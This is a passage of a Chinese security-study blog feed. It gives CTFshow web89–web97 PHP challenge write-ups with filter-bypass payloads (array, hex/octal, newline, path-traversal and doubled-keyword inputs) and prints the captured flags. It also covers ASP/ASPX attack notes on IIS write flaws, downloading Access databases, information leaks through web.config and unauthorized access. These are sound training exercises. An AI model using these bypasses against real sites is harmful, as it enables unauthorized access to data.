class="keyword">if</span>(<span class="title function_ invoke__">intval</span>(<span class="variable">$ii</span>==<span class="variable">$i</span>))&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="number">4</span>.查字符串</span><br><span class="line">    <span class="title function_ invoke__">strpos</span>(<span class="variable">$str1</span>,<span class="variable">$str2</span>[,<span class="variable">$start</span>]):查找<span class="variable">$str2</span>在<span class="variable">$str1</span>第一次出现位置，起始为<span class="variable">$start</span>,默认起始为<span class="number">0</span></span><br><span class="line">    <span class="variable">$i</span>=<span class="number">666</span>;<span class="variable">$ii</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">strpos</span>(<span class="variable">$ii</span>,<span class="variable">$i</span>,<span class="string">&quot;0&quot;</span>))&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// %0a666 换行绕过，空格也算换行 </span></span><br><span class="line">    <span class="comment">// ?num=%0a666</span></span><br><span class="line"></span><br><span class="line"><span class="number">5</span>.查是否在数组内</span><br><span class="line">    <span class="title function_ invoke__">in_array</span>(<span class="variable">$val</span>,<span class="variable">$arr</span>,<span class="variable">$strict</span>):检测值<span class="variable">$val</span>是否在数组<span class="variable">$arr</span>内</span><br><span class="line">            <span class="variable">$strict</span>可选，为True时同时判断类型是否相等。(考点<span class="variable">$strict</span>),否则相当于(==)</span><br><span class="line">    题目</span><br><span class="line">    <span class="variable">$whitelist</span> = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>];</span><br><span class="line">    <span class="variable">$page</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;i&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">in_array</span>(<span class="variable">$page</span>,<span class="variable">$whitelist</span>))&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;yes&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment"># ?i=1ex</span></span><br><span class="line"></span><br><span class="line"><span class="number">6</span>.正则表达式执行</span><br><span class="line">    <span class="title function_ invoke__">preg_match</span>():只能处理字符串，如果不按规定传入字符串，通常传入一个数组，这样会报错</span><br><span class="line">    <span class="keyword">int</span> <span class="title function_ invoke__">preg_match</span> ( <span class="keyword">string</span> <span class="variable">$pattern</span> , <span class="keyword">string</span> <span class="variable">$subject</span> [, <span class="keyword">array</span> &amp;<span class="variable">$matches</span> [, <span class="keyword">int</span> <span class="variable">$flags</span> = <span class="number">0</span> [, <span class="keyword">int</span> <span class="variable">$offset</span> = <span class="number">0</span> ]]] )</span><br><span class="line">    <span class="variable">$pattern</span>: 要搜索的模式，字符串形式。(正则表达式)</span><br><span class="line">    <span class="variable">$subject</span>: 输入字符串。(被搜索的字符串)</span><br><span class="line">    <span class="variable">$matches</span>: 如果提供了参数matches，它将被填充为搜索结果。(存储搜索结果)</span><br><span class="line">        <span class="variable">$matches</span>[<span class="number">0</span>]将包含完整模式匹配到的文本， </span><br><span class="line">        <span class="variable">$matches</span>[<span class="number">1</span>] 将包含第一个捕获子组匹配到的文本，以此类推。</span><br><span class="line">    <span class="variable">$flags</span>：flags 可以被设置为以下标记值：</span><br><span class="line">        PREG_OFFSET_CAPTURE: 如果传递了这个标记，对于每一个出现的匹配返回时会附加字符串偏移量(相对于目标字符串的)。</span><br><span class="line">        注意：这会改变填充到matches参数的数组，使其每个元素成为一个由 第<span class="number">0</span>个元素是匹配到的字符串，第<span class="number">1</span>个元素是该匹配字符串 </span><br><span class="line">                在目标字符串subject中的偏移量。</span><br><span class="line">    offset: 通常，搜索从目标字符串的开始位置开始。</span><br><span class="line">        可选参数 offset 用于 指定从目标字符串的某个未知开始搜索(单位是字节)。</span><br><span class="line"></span><br><span class="line">    题目：</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>(<span class="string">&#x27;num&#x27;</span>)))&#123;</span><br><span class="line">        <span class="variable">$num</span>=<span class="variable">$_GET</span>(<span class="string">&#x27;num&#x27;</span>);</span><br><span class="line">        <span class="comment">// 正则表达式过滤</span></span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_math</span>(<span class="string">&quot;/[0-9]/&quot;</span>,<span class="variable">$num</span>))&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;nonono!&quot;</span>); <span class="comment">#终止输出</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 获取整数值</span></span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">intval</span>(<span class="variable">$num</span>))&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment"># ?num[]=1</span></span><br><span class="line"></span><br><span class="line"><span class="number">7</span>.字符串过滤</span><br><span class="line">    <span class="title function_ invoke__">str_replace</span>(<span class="variable">$str1</span>,<span class="variable">$str2</span>,<span class="variable">$str</span>,<span class="variable">$val</span>):在<span class="variable">$str</span>当中查找<span class="variable">$str1</span>并且将<span class="variable">$str1</span>替换为<span class="variable">$str2</span>，<span class="variable">$val</span>可选，用于计算替换次数</span><br><span class="line"></span><br><span class="line">    题目：无迭代过滤</span><br><span class="line">    无法迭代过滤可以演变为很多形式的过滤，像变量名字过滤，路径过滤等</span><br><span class="line">    <span class="comment">// 过滤写法：假如我过滤../只有过滤一次，那么就能写成这样子的形式来绕过../一次过滤：....//或者../../</span></span><br><span class="line">    <span class="comment">// 代码实现：str_replace(&#x27;../&#x27;,&#x27;&#x27;,$path);</span></span><br><span class="line">    <span class="variable">$sql</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;s&#x27;</span>];</span><br><span class="line">    <span class="variable">$sql</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;select&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="variable">$sql</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$sql</span>;</span><br><span class="line">    <span class="comment"># ?s=sselectelect</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="WebShow赛题"><a href="#WebShow赛题" class="headerlink" title="WebShow赛题"></a>WebShow赛题</h2><p>题目：web89~web97</p><p>都是函数代码特性。==&gt; CTF源于代码审计</p><h3 id="题目1"><a href="#题目1" class="headerlink" title="题目1"></a>题目1</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$num</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/[0-9]/&quot;</span>, <span class="variable">$num</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no no no!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">intval</span>(<span class="variable">$num</span>))&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment"># 解题：http://5b447cb0-6f85-417f-8ebb-bb069cab070d.challenge.ctf.show?num[]=1</span></span><br><span class="line"><span class="comment"># 返回下面结果</span></span><br><span class="line">Warning: <span class="title function_ invoke__">preg_match</span>() expects parameter <span class="number">2</span> to be <span class="keyword">string</span>, <span class="keyword">array</span> given in /<span class="keyword">var</span>/www/html/index.php on line <span class="number">20</span></span><br><span class="line">ctfshow&#123;<span class="number">2</span>f597376-fbcd-<span class="number">436</span>c-<span class="number">8604</span>-f28bdeb97db7&#125;</span><br></pre></td></tr></table></figure><h3 id="题目2"><a href="#题目2" class="headerlink" title="题目2"></a>题目2</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$num</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$num</span>===<span class="string">&quot;4476&quot;</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no no no!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 识别进制并且转换为十进制进行比较</span></span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">intval</span>(<span class="variable">$num</span>,<span class="number">0</span>)===<span class="number">4476</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">intval</span>(<span class="variable">$num</span>,<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># URL输入：?num=%0a4476,或者?num=0x117c(十六进制)   </span></span><br><span class="line">ctfshow&#123;b3737b6f-<span class="number">1253</span>-<span class="number">47</span>f0-<span class="number">87</span>fe-<span class="number">48</span>cfd4ef33a3&#125;</span><br></pre></td></tr></table></figure><h3 id="题目3"><a href="#题目3" class="headerlink" title="题目3"></a>题目3</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line"><span class="variable">$a</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^php$/im&#x27;</span>, <span class="variable">$a</span>))&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^php$/i&#x27;</span>, <span class="variable">$a</span>))&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;hacker&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;nonononono&#x27;</span>;</span><br><span class="line">&#125; </span><br><span class="line"><span class="comment"># 分析</span></span><br><span class="line"><span class="comment"># &#x27;/^php$/i&#x27;    正则表达式，表示首尾都是php，i:忽略大小写,m:启用多行模式，即可以匹配含有换行符的字符串中的每一行。</span></span><br><span class="line"><span class="comment"># 因为换行检测是每行都匹配的，通过第一层的换行检测，第二层没有换行检测，自动跳转到else部分输出flag，%0a是换行</span></span><br><span class="line"><span class="comment"># 最终式子：</span></span><br><span class="line"><span class="comment"># ?cmd=php%0aphp</span></span><br></pre></td></tr></table></figure><h3 id="题目4"><a href="#题目4" class="headerlink" title="题目4"></a>题目4</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$num</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$num</span>==<span class="number">4476</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no no no!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">intval</span>(<span class="variable">$num</span>,<span class="number">0</span>)==<span class="number">4476</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">intval</span>(<span class="variable">$num</span>,<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="comment"># 换行绕过或者进制绕过</span></span><br><span class="line"><span class="comment"># 十六进制绕过：?num=0x117c</span></span><br><span class="line"><span class="comment"># ctfshow&#123;dc98fe58-f160-45a3-aac9-19b57830750a&#125;</span></span><br></pre></td></tr></table></figure><h3 id="题目5"><a href="#题目5" class="headerlink" title="题目5"></a>题目5</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$num</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$num</span>==<span class="number">4476</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no no no!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/[a-z]/i&quot;</span>, <span class="variable">$num</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no no no!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">intval</span>(<span class="variable">$num</span>,<span class="number">0</span>)==<span class="number">4476</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">intval</span>(<span class="variable">$num</span>,<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment"># 分析：</span></span><br><span class="line"><span class="comment"># 基于intval，限制条件是不能等于整数4476和不能出现英文字母，不论大小写。</span></span><br><span class="line"><span class="comment"># 选择将4476转为八进制</span></span><br><span class="line"><span class="comment"># ?num=010574</span></span><br><span class="line"><span class="comment"># flag：ctfshow&#123;9bd7dbdf-f856-4a83-9167-5c1cedcad20c&#125;</span></span><br></pre></td></tr></table></figure><h3 id="题目6题目7"><a href="#题目6题目7" class="headerlink" title="题目6题目7"></a>题目6题目7</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$num</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$num</span>===<span class="string">&quot;4476&quot;</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no no no!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/[a-z]/i&quot;</span>, <span class="variable">$num</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no no no!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">strpos</span>(<span class="variable">$num</span>, <span class="string">&quot;0&quot;</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no no no!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">intval</span>(<span class="variable">$num</span>,<span class="number">0</span>)===<span class="number">4476</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment"># 和上一道题目差不多，使用空格换行绕过strpos。</span></span><br><span class="line"><span class="comment"># 总结下就是八进制绕过“===”和正则表达式，空格换行绕过strpos</span></span><br><span class="line"><span class="comment"># ?num= 010574  =&gt; 中间多了个空格</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$num</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$num</span>==<span class="number">4476</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no no no!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/[a-z]|\./i&quot;</span>, <span class="variable">$num</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no no no!!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">strpos</span>(<span class="variable">$num</span>, <span class="string">&quot;0&quot;</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no no no!!!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">intval</span>(<span class="variable">$num</span>,<span class="number">0</span>)===<span class="number">4476</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment"># 解法差不多，绕过弱类型比较和正则表达式，再换行绕过strpos。</span></span><br><span class="line"><span class="comment"># ?num= 010574  =&gt; 中间多了个空格</span></span><br></pre></td></tr></table></figure><h3 id="题目8"><a href="#题目8" class="headerlink" title="题目8"></a>题目8</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;u&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;u&#x27;</span>]==<span class="string">&#x27;flag.php&#x27;</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no no no&quot;</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">highlight_file</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;u&#x27;</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125; </span><br><span class="line"><span class="comment"># 弱类型对比，思路：尝试将在不等于flag.php字符串的情况下调用flag.php</span></span><br><span class="line"><span class="comment"># 解决办法：本地调用&quot;./flag.php&quot;</span></span><br><span class="line"><span class="comment"># ?u=./flag.php</span></span><br><span class="line"><span class="comment"># 读取出来的内容如下：</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-09-16 11:24:37</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-09-16 11:25:00</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="variable">$flag</span>=<span class="string">&quot;ctfshow&#123;f1897027-e4b6-452d-a6e6-b87bd4af83ec&#125;&quot;</span>; </span><br></pre></td></tr></table></figure><h3 id="题目9"><a href="#题目9" class="headerlink" title="题目9"></a>题目9</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>]) <span class="keyword">and</span> <span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;b&#x27;</span>])) &#123;</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>] != <span class="variable">$_POST</span>[<span class="string">&#x27;b&#x27;</span>])</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">md5</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>]) === <span class="title function_ invoke__">md5</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;b&#x27;</span>]))</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">&#x27;Wrong.&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment"># 思路：使用POST传参传入变量a和b，因为是强类型比较，使用数组绕过</span></span><br><span class="line"><span class="comment"># 使用POST传参的方法：BP抓包，或者浏览器使用hackbar插件工具</span></span><br><span class="line"><span class="comment">// 返回如下</span></span><br><span class="line">Warning: <span class="title function_ invoke__">md5</span>() expects parameter <span class="number">1</span> to be <span class="keyword">string</span>, <span class="keyword">array</span> given in /<span class="keyword">var</span>/www/html/index.php on line <span class="number">17</span></span><br><span class="line">Warning: <span class="title function_ invoke__">md5</span>() expects parameter <span class="number">1</span> to be <span class="keyword">string</span>, <span class="keyword">array</span> given in /<span class="keyword">var</span>/www/html/index.php on line <span class="number">17</span></span><br><span class="line">ctfshow&#123;a970180a-ecf3-<span class="number">4</span>b3f-<span class="number">973</span>a-f781670391d3&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
          <category> SEC-WEB攻防-04 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SEC </tag>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SEC-2022版-0010-WEB攻防-01-ASP/ASPX</title>
      <link href="/2023/05/09/SEC-Study-0038/"/>
      <url>/2023/05/09/SEC-Study-0038/</url>
      
        <content type="html"><![CDATA[<p>Web漏洞篇特性漏洞+共性漏洞</p><p>ASP/ASPX-Windows的iis运行，不会在Linux平台运行。</p><span id="more"></span><h1 id="安全攻防"><a href="#安全攻防" class="headerlink" title="安全攻防"></a>安全攻防</h1><p>1、Web源码<br>2、开发语言<br>3、中间件平台<br>4、数据库类型<br>4、第三方插件或软件</p><p>WEB漏洞与服务漏洞</p><p>WEB漏洞是网站页面以及代码上的漏洞，服务类漏洞是中间件上的漏洞。</p><h1 id="ASP"><a href="#ASP" class="headerlink" title="ASP"></a>ASP</h1><h2 id="组合套件"><a href="#组合套件" class="headerlink" title="组合套件"></a>组合套件</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">Windows+ iis+asp +access</span><br><span class="line"></span><br><span class="line">iis    中间件   存在写入漏洞/也就是勾选写入权限后产生的漏洞</span><br><span class="line">                IIS PUT漏洞</span><br><span class="line">access 数据库   一般后缀名为：asp，<span class="title function_ invoke__">asa</span>(可执行)，<span class="title function_ invoke__">mdb</span>(可下载,且在网站目录下)</span><br><span class="line"></span><br><span class="line">文件是否被解析可以在主目录那儿设置</span><br><span class="line"></span><br><span class="line">思路：知道数据库地址，尝试连接并且下载数据库文件，之后就是获得账密信息了。</span><br><span class="line"></span><br><span class="line">如何找到：</span><br><span class="line">    默认源码安装可以直接找到</span><br><span class="line">    使用后台扫描工具扫描</span><br><span class="line"></span><br><span class="line">最大的缺陷莫过于无法找到相关站点（少之又少）</span><br></pre></td></tr></table></figure><h2 id="知识点："><a href="#知识点：" class="headerlink" title="知识点："></a>知识点：</h2><p>1、ASP环境搭建组合<br>2、ASP-数据库下载&amp;植入<br>3、IIS-短文件&amp;解析&amp;写权限</p><h1 id="ASPX-NET"><a href="#ASPX-NET" class="headerlink" title="ASPX(.NET)"></a>ASPX(.NET)</h1><blockquote><p>需要反编译才能破解大量的dll文件。<br>.net使用dll：形式与java类似，java使用jar文件，关键代码在dll文件当中 –&gt; 使用反编译反编dll文件,java是反编译jar包<br>使用Windows主机IIS作为中间件。</p></blockquote><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">组合</span><br><span class="line">Windows+ iis+aspx +sqlserver</span><br><span class="line"></span><br><span class="line">➢.NET项目-DLL文件反编译指向-代码特性</span><br><span class="line">bin文件夹下存放dll可执行文件</span><br><span class="line">bin下文件代码数目极少时，要观察其中调用的函数，找到对应的函数再研究其中的安全问题</span><br><span class="line">dll源码反编译有助于我们做安全测试</span><br><span class="line"></span><br><span class="line">工具：ILS.py</span><br><span class="line"></span><br><span class="line">➢.NET项目-Web.config错误调试-信息泄露</span><br><span class="line">web.config  网站配置文件</span><br><span class="line"></span><br><span class="line">web.config当中：网站自定义错误部分</span><br><span class="line">&lt;customErrors mode=<span class="string">&quot;Off&quot;</span>&gt;</span><br><span class="line">&lt;/customErrors&gt;</span><br><span class="line">mode有三种模式：Off，On,?（第三种老师没说）</span><br><span class="line">Off：部分代码+版本</span><br><span class="line">On：自己指定报错信息，否则报本身错误</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">➢.NET项目-身份验证未授权访问-安全漏洞</span><br><span class="line">未授权访问：未经授权却访问到了只有授权访问才能见到的东西</span><br><span class="line">体现：后端看到了管理员界面(危害更大)，前端看到了VIP用户界面</span><br><span class="line"></span><br><span class="line">具体：</span><br><span class="line">判断用户身份</span><br><span class="line">场景：由于用户后台本身有多个功能文件页面(相当于是你写了N个网页，但网页需要身份认证)</span><br><span class="line"><span class="number">1</span>.每个文件添加判断代码</span><br><span class="line"><span class="number">2</span>.创建一个专门判断的文件，其他文件对它进行包含调用(实际应用更多)。</span><br><span class="line"></span><br><span class="line">安全方向思路：</span><br><span class="line"><span class="number">1</span>.找到那些没有包含验证代码的文件。</span><br><span class="line">    未授权访问页面---黑盒测试直接扫描或者爬虫</span><br><span class="line"></span><br><span class="line">    看哪个文件不加载验证代码，然后对某些页面进行未授权访问</span><br><span class="line"></span><br><span class="line"><span class="number">2</span>.验证代码文件是否可以绕过。</span><br><span class="line">    未授权访问文件甄别---白盒测试直接看代码</span><br><span class="line"></span><br><span class="line">    跟踪代码执行逻辑，从登陆验证文件调用包含文件为主，</span><br><span class="line">    向bin当中寻找符合的条件的验证代码逻辑，不断跟踪代码执行，</span><br><span class="line">    最后找到对应的变量，在抓包当中修改值进行绕过。（修改值进行绕过）</span><br></pre></td></tr></table></figure><h2 id="知识点：-1"><a href="#知识点：-1" class="headerlink" title="知识点："></a>知识点：</h2><p>1、.NET配置调试-信息泄露<br>2、.NET源码反编译-DLL反编译<br>3、.NET常见安全问题-未授权访问</p>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
          <category> SEC-WEB攻防-04 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SEC </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SEC-2022版-0009-php开发-02-前端验证JS/AJAX&amp;PHP框架</title>
      <link href="/2023/05/07/SEC-Study-0037/"/>
      <url>/2023/05/07/SEC-Study-0037/</url>
      
